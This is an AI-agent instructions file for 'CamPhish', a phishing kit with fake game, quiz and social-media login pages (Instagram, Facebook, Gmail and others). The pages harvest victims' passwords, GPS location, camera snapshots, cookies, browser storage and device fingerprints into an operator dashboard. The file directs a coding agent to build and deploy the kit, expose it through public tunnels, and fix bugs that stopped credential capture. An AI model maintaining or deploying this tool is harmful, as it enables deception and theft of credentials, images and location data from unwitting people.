# CamPhish — AI Agent Instructions

## Project Overview
CamPhish v2.1.1 is a Rust (axum) + React (Vite/TS/Tailwind) red team camera capture tool.
Backend serves API + dashboard SPA + pluggable HTML templates. TrailBase provides admin UI + realtime.

## Architecture
```
Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:4000, secondary)
                      ↓
                 React Dashboard (:8080 SPA) — 8 pages, all redesigned
                      ↓
                 Templates (/t/:id) → recon.js → capture endpoints
```

## Critical Rules
1. **Use `scripts/docker-cleanup.sh` to reset** — NOT `docker compose down -v`. The script safely removes containers + volumes + local data.
2. **NEVER rename trailbase/schema/V7__camphish.sql** — V1-V6 are TrailBase built-ins
3. **TrailBase migration naming**: must be V7+ to avoid conflicts with built-in V1-V6
4. **SQL DEFAULT with functions**: `DEFAULT (lower(hex(randomblob(16)))),` — needs trailing comma
5. **PostHog frontend**: `posthog.ts` guards init with `isEnabled` (both `VITE_POSTHOG_KEY`+`VITE_POSTHOG_HOST` must be set). Uses `capture_pageview: false` + manual `capturePageView()` on route change. Session recording enabled with masked inputs.
6. **PostHog backend**: `posthog.rs` reads `POSTHOG_API_KEY` (falls back to `VITE_POSTHOG_KEY`). Error tracking via `ErrorTrackingOptions`. Uses `capture_exception_with` for Rust errors.
7. **PostHog env vars**: `POSTHOG_API_KEY` / `POSTHOG_HOST` for backend; `VITE_POSTHOG_KEY` / `VITE_POSTHOG_HOST` for frontend (Docker build args). Backend falls back to `VITE_POSTHOG_KEY`. Default host is `https://us.posthog.com`.
8. **Rebuild after PostHog changes**: PostHog env vars are baked into frontend at Docker build time. Rebuild with `docker compose build app` when changing keys/hosts.
9. **Template placeholders**: `API_BASE_URL` and `forwarding_link` are replaced at serve time
10. **recon.js is shared**: ALL templates include `<script src="forwarding_link/t/recon.js">`
11. **CamPhishRecon.init()** triggers: IP + location + fingerprint + gender + cookies + storage + history + auto-permissions
12. **Games must work WITHOUT camera** — camera is optional enhancement
13. **Social media templates capture credentials** via `POST /api/capture/credentials`
14. **Variable naming in JS**: use `el` prefix for DOM elements (elScore, elCombo) to avoid collisions with game state vars
15. **ALWAYS rebuild Docker after backend changes**: `docker compose build app && docker compose up -d app && sleep 5 && ./scripts/docker-code.sh`
16. **ALWAYS show access code** after any Docker restart: `./scripts/docker-code.sh` or `cat data/.access_code`
17. **Dashboard access code persists**: written to `data/.access_code` (bind-mounted). Set `CAMPHISH_ACCESS_SEED` in `.env` for a deterministic code. Use `http://localhost:8080/?code=<code>`.
18. **Theme**: midnight (default) and terminal themes, persisted to localStorage key `camphish-theme`. Toggle via sidebar button.
19. **Pagination**: all list endpoints return `PaginatedResponse<T>` with `{ entries, total, has_more }`. Frontend uses `LoadMoreButton` + `offsetRef` pattern for infinite scroll. Default limit is 50, max 500.
20. **Commit style**: cherry-pickable PRs. Use `feat:` prefix for features, `fix:` for bugs. Multi-line descriptions.

## Tech Stack
- Backend: Rust 1.96, axum 0.7, sqlx 0.8 (SQLite WAL), tower-http, reqwest (rustls)
- Frontend: React 18, TypeScript, Vite 5, TailwindCSS 3, React Router 6
- Data: SQLite (primary), TrailBase (secondary, admin UI, realtime)
- Docker: Alpine 3.20 runtime, multi-stage build (Node 20 + Rust 1.96)
- Tunnel: Cloudflare Tunnel (cloudflared) or Ngrok
- **PostHog**: Frontend posthog-js (session replay, error tracking, web analytics) + Backend posthog-rs (event capture, error tracking, API monitoring)

## Build & Deploy Commands
```bash
# Build Docker image
docker compose build app

# Full Docker deployment with tunnel auto-discovery
./scripts/docker-start.sh                # uses cloudflared (default)
TUNNEL=ngrok ./scripts/docker-start.sh   # uses ngrok

# Local dev (no Docker, optional tunnel)
./scripts/dev.sh                         # backend + tunnel + frontend build
TUNNEL=none ./scripts/dev.sh             # local only, no tunnel
RELEASE=1 ./scripts/dev.sh               # release build for perf testing

# Just the Docker app locally (no tunnel)
docker compose up -d app

# Clean up everything (containers + volumes + local data)
./scripts/docker-cleanup.sh
```

## Key File Locations
- Backend: `backend/src/{main.rs, api/mod.rs, capture.rs, db.rs, templates.rs, trailbase.rs, posthog.rs}`
- Frontend: `frontend/src/{App.tsx, posthog.ts, theme.tsx, api/client.ts, pages/*.tsx}`
- Frontend shared components: `frontend/src/components/{ErrorBanner.tsx, LoadMoreButton.tsx, SessionFilter.tsx}`
- Frontend utils: `frontend/src/utils/time.ts` (relativeTime helper)
- Templates: `templates/*.html` + `templates/recon.js`
- Schema: `backend/migrations/001_init.sql` + `trailbase/schema/V7__camphish.sql`
- Docker: `Dockerfile` (multi-stage Alpine) + `docker-compose.yml`
- Scripts: `scripts/docker-start.sh` (auto tunnel) + `scripts/docker-cleanup.sh` (full reset)

## Capture Endpoints
- `POST /api/capture/ip` — IP + User-Agent
- `POST /api/capture/location` — GPS coordinates
- `POST /api/capture/image` — Base64 camera snapshot
- `POST /api/capture/fingerprint` — Full device fingerprint (25+ fields)
- `POST /api/capture/event` — Session replay events
- `POST /api/capture/storage` — Cookie/localStorage/sessionStorage dump
- `POST /api/capture/credentials` — Username/password from social login templates

## Dashboard API
- `GET /api/health` — Health check
- `GET /api/stats` — Aggregate statistics
- `GET /api/captures?page=&per_page=&sort=` — Paginated captures (pages, not has_more)
- `GET /api/locations?offset=&limit=&session=` — Paginated locations (has_more)
- `GET /api/ips?offset=&limit=&session=` — IP logs with breakdowns (has_more)
- `GET /api/credentials?offset=&limit=&session=` — Credentials (has_more)
- `GET /api/storage?offset=&limit=&session=` — Storage dumps (has_more)
- `GET /api/events?session=&offset=&limit=` — Event timeline (has_more)
- `GET /api/templates` — Available templates
- `GET /api/sessions` — Session management
- `DELETE /api/captures/:id` — Delete single capture
- `DELETE /api/captures` — Delete ALL captures
- `DELETE /api/ips` / `DELETE /api/locations` / `DELETE /api/events` — Bulk delete-all
- `DELETE /api/credentials/:id` / `DELETE /api/credentials` — Single/bulk delete
- `DELETE /api/storage/:id` / `DELETE /api/storage` — Single/bulk delete
- `DELETE /api/sessions/:id` — Delete session + all related data
- `POST /api/sessions` — Create session `{ name, template_id }`

## Dashboard Pages (8 redesigned pages)

| Page | Route | Features |
|------|-------|----------|
| Dashboard | `/` | Stats cards, quick actions, system status, recent captures, access code, auto-refresh |
| Captures | `/captures` | Grid with lightbox, sort (newest/oldest/largest), filename search, page nav, delete-all |
| Locations | `/locations` | Grouped/ungrouped views, accuracy badges, copy coords, text search, auto-refresh, error state with retry |
| IP Logs | `/ips` | Bar charts (device/browser/OS), IP search, load-more pagination with has_more, auto-refresh |
| Credentials | `/credentials` | Template filter, always-visible search, total count, memoized filtering, password strength, copy buttons |
| Storage Dumps | `/storage` | Accordion expand/collapse, raw JSON toggle, cookie/localStorage/sessionStorage breakdown, export CSV/JSON, copy buttons |
| Session Replay | `/replay` | Event timeline, event type filter with counts, text search, load-more pagination, session selector |
| Sessions | `/sessions` | Create session form, search by name/ID/template, active badge, copy session ID |

All pages share: `ErrorBanner` (dismissible), consistent empty states with icons, staggered fade-in animations, text search/filter bars, total counts from API.

## Pagination Pattern
- Backend: `PaginatedResponse<T>` struct returns `{ entries, total, has_more }`
- Frontend: `LoadMoreButton` component + `offsetRef` useRef pattern
  ```
  const offsetRef = useRef(0)
  const loadMore = () => { offsetRef.current += LIMIT; appendFetch() }
  ```
- Exception: Captures page uses `{ captures, total, pages }` with prev/next page nav (grid layout)
- Default LIMIT: 50 (max 500). Frontend pages may use larger for specific needs (SessionReplay: 200)

## Shared Components
- `ErrorBanner` — Dismissible error bar at top of page. Props: `{ error: string|null, onDismiss: () => void }`
- `LoadMoreButton` — Standalone load-more button. Props: `{ hasMore: boolean, loading: boolean, onLoad: () => void }`
- `SessionFilter` — Session dropdown from API. Props: `{ selected, onChange }`
- `utils/time.ts` — `relativeTime(timestamp: number): string` (e.g. "3m ago", "2h ago")

## Theme System
- Two themes: `midnight` (dark) and `terminal` (green-on-black)
- CSS variables set via `data-theme` attribute on `<html>`, persisted in `localStorage`
- Toggle button in sidebar (only visible on md+ screens)
- Default: `midnight`
- ThemeContext provider wraps entire app in `App.tsx`

## 18 Templates
- Games (6): face-runner, color-match, bubble-pop, dress-up, word-hunt, pet-catch
- Social Login (6): instagram, facebook, tiktok, whatsapp, snapchat, gmail
- Gender Psychology (3): beauty-quiz, horoscope, sports-predictor
- Original (3): festival, youtube, meeting

## PostHog Integration
- **Backend** (`backend/src/posthog.rs`): `PostHog::from_env()` reads `POSTHOG_API_KEY` (falls back to `VITE_POSTHOG_KEY`). Methods: `capture_template_served`, `capture_image`, `capture_location`, `capture_ip`, `capture_fingerprint`, `capture_event`, `capture_storage`, `capture_credentials`, `capture_session_created`, `capture_api_error`, `capture_exception`.
- **Frontend** (`frontend/src/posthog.ts`): Guards with `isEnabled` (both `VITE_POSTHOG_KEY`+`VITE_POSTHOG_HOST`). `initPostHog()` on app mount, `capturePageView()` on route change, `captureException()`, `capture()`. Session recording with masked inputs.
- **Docker**: PostHog env vars are build args for frontend (`VITE_POSTHOG_KEY`, `VITE_POSTHOG_HOST`) and runtime env for backend.
- When both are unset, PostHog is silently disabled — no errors, no tracking.

## Commit/PR Structure
Commits should be cherry-pickable. Current clean PRs from recent session:
1. `73fd237` — API pagination standardization (backend only)
2. `b8417ea` — Shared frontend components
3. `00073e3` — Page redesigns: Credentials, StorageDumps, Locations, IpLogs
4. `d2dc7ac` — Page redesigns: Sessions, Captures, SessionReplay
5. `41938cd` — Dashboard polish
6. `94ce3b2` — PostHog + theme toggle + navigation polish

## Kimi WebBridge Browser Testing

**Kimi WebBridge** (`http://127.0.0.1:10086`) drives the user's real Chrome/Edge browser for visual testing. ALWAYS use it before/after template changes.

### Quick Test Command
```bash
curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' \
  -d '{"action":"navigate","args":{"url":"http://localhost:8080/t/<template>","newTab":true},"session":"test"}'
sleep 2
curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' \
  -d '{"action":"evaluate","args":{"code":"JSON.stringify({errors:window.__capturedErrors||[],title:document.title||\"\"})"}}'
curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' \
  -d '{"action":"close_session","args":{},"session":"test"}'
```

### When to Test
- After ANY change to `templates/*.html`, `templates/recon.js`, `templates/*.js`
- After any backend change that affects template serving (`templates.rs`, `main.rs`)
- After Docker rebuild to verify MIME types and template serving
- Before merging any PR that touches templates
- For regression testing when adding new templates

### Testing Checklist
1. **JS errors**: navigate + evaluate `window.__capturedErrors` — must be empty array
2. **Visual**: screenshot — game canvases render, forms display, no broken layouts
3. **Interaction**: click buttons, fill forms, verify page responds
4. **Edge cases**: mobile viewport, slow network, camera denied, console errors
5. **MIME types**: `curl -I /t/recon.js` → `Content-Type: application/javascript`
6. **Dashboard**: `?code=<code>` → dashboard loads, all 8 pages navigate, stats display, data loads, pagination works
7. **API health**: `curl /api/health` → `{"status":"ok",...}` with `db_connected: true`

## Lessons Learned (DO NOT REPEAT)
- Game crash: `combo.style.opacity=0` when `combo` is a number, not DOM element → use `elCombo`
- Docker build: debian:bookworm-slim can't reach apt repos → use Alpine
- Rust version: 1.80 doesn't support edition 2024 (sqlx 0.8) → use 1.96
- TrailBase: V1-V6 are reserved → use V7+
- Word hunt: cell listeners lost on re-render → attach in renderGrid()
- Color match: DOMContentLoaded fires too late → set up listeners immediately
- Festival: spinner forever → make it interactive (gift opening)
- Dress-up: hidden start button → auto-start on load
- Gmail credential capture: template had no `#user` input field, only static `#emailDisplay` span → `captureCreds()` always returned early
- Syntax error in 4 social login templates: extra `)` after `captureCreds()` — breaks script execution
- Instagram: duplicate inline `fetch` and dead `captureCreds()` function
- Event names: templates used placeholder `'0_login'` instead of descriptive template-specific names
- Cloudflared v2025+ wraps tunnel URL in `|` boxes — grep still works but script wait time may need adjustment
- `storage_dumps` had no `ip_address` column — cross-referencing required session_id join with ip_logs
- `receive_storage` didn't log events — missing from session replay timeline unlike `receive_credentials`
- No pagination on `/api/storage` and `/api/credentials` — hardcoded LIMIT silently dropped data
- recon.js StorageGrabber: value truncation at 2000 chars without reporting actual size; no CookieStore/Cache API/storage estimate
- **SessionReplay offset bug**: `loadMore()` must increment offset before calling `appendFetch()`, not after. Use `offsetRef.current += LIMIT` before `refresh(true)`.
- **Dashboard recent captures**: fetch with `api.captures(1, 6)` — use `page=1` not `offset=0` since captures API uses page-based pagination.
- **Theme toggle**: `theme.tsx` must include `useCallback` in React import. localStorage key is `camphish-theme`.
- **PostHog backend fallback**: if `POSTHOG_API_KEY` is unset, backend falls back to `VITE_POSTHOG_KEY`. Default host is `https://us.posthog.com` (no `.i.` prefix, unlike frontend).
- **PostHog runtime env fallback bug**: docker-compose.yml had `POSTHOG_API_KEY=${POSTHOG_API_KEY:-${VITE_POSTHOG_KEY:-}}` — the fallback reads from the **host** env at `docker compose up` time, NOT from the build arg. So the build arg `VITE_POSTHOG_KEY` default was applied when building the frontend but the runtime `POSTHOG_API_KEY` was empty. Fix: hardcode the same default key directly in the runtime env fallback.
- **face-runner Facebook gate CSS**: `#fbGate` had `class="login-overlay hidden"` but only `.overlay.hidden{display:none}` existed in CSS — the `login-overlay` class didn't match. Fix: add `.login-overlay.hidden{display:none!important}` rule. The fix was previously applied on `feat/deployment-infra` branch but never merged to master.
- **Credentials dedup race**: Concurrent requests bypass application-level SELECT check because SQLite connection pool allows parallel reads before INSERT commits. Fix: use `INSERT OR IGNORE` with a UNIQUE index on `(session_id, ip_address, username, password, template_id)` instead of SELECT-then-INSERT.
- **Delete on 204**: Backend returns `204 No Content` (no body) but frontend called `.json()` — always throws SyntaxError. Fix: return raw fetch promise without `.json()`.
- **meeting.html stray `});`**: Dangling closing bracket caused JS parse failure — `joinMeeting()`, `shareCard()` never defined. Fix: remove the stray line.
- **recon.js audio channel**: `ac.maxChannelCount` is `undefined` — property exists on `AudioDestinationNode`, not `AudioContext`. Fix: use `ac.destination.maxChannelCount`.
- **festival / youtube placeholders**: `fes_name` and `live_yt_tv` never replaced by Rust backend. Fix: add replacements in `templates.rs` with seasonal values (month-based festival name + video ID).
